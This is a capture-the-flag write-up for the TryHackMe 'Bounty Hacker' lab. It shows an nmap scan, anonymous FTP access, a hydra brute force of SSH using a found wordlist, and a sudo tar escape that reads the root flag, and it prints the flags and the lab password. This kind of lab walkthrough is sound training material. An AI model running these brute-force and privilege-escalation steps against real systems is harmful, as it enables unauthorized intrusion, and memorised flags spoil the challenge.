# Bounty Hacker

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

 You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

# Find open ports on the machine

Nmap discovers several common services running on their standard ports: 21 (FTP), 22 (SSH) and 80 (HTTP).

~~~
unknown@kali:~$ nmap -sC -sV -A 10.10.207.219
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 09:10 CEST
Nmap scan report for 10.10.207.219
Host is up (0.084s latency).
Not shown: 970 filtered ports, 27 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.66 seconds
~~~

# Who wrote the task list? 

Let's connect as `anonymous` on the FTP service:

~~~
unknown@kali:~$ ftp 10.10.207.219
Connected to 10.10.207.219.
220 (vsFTPd 3.0.3)
Name (10.10.207.219:unknown): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.06 secs (7.4185 kB/s)
mget task.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (30.7010 kB/s)
ftp> exit
221 Goodbye.
~~~

The task list has been written by lin:

~~~
unknown@kali:/data/tmp$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
~~~

Answer: `lin`

# What service can you bruteforce with the text file found?

Answer: `ssh`

# What is the users password? 

The other file seems to be a password file:

~~~
unknown@kali:/data/tmp$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
~~~

We can try to bruteforce lin's SSH password:

~~~
unknown@kali:/data/tmp$ hydra -l lin -P locks.txt ssh://10.10.207.219
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-13 09:13:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.207.219:22/
[22][ssh] host: 10.10.207.219   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
~~~

Lin's password is `RedDr4gonSynd1cat3`.

# user.txt

Let's connect as lin over SSH:

~~~
unknown@kali:/data/tmp$ ssh lin@10.10.207.219
The authenticity of host '10.10.207.219 (10.10.207.219)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.207.219' (ECDSA) to the list of known hosts.
lin@10.10.207.219's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
~~~

User flag: `THM{CR1M3_SyNd1C4T3}`

# root.txt

Let's check lin's privileges. Lin can run `tar` as root:

~~~
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
~~~

Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) reveals that we can take advantage of it to read files as root.

~~~
lin@bountyhacker:~/Desktop$ LFILE=/root/root.txt
lin@bountyhacker:~/Desktop$ sudo tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
THM{80UN7Y_h4cK3r}
lin@bountyhacker:~/Desktop$ 
~~~

Root flag: `THM{80UN7Y_h4cK3r}`
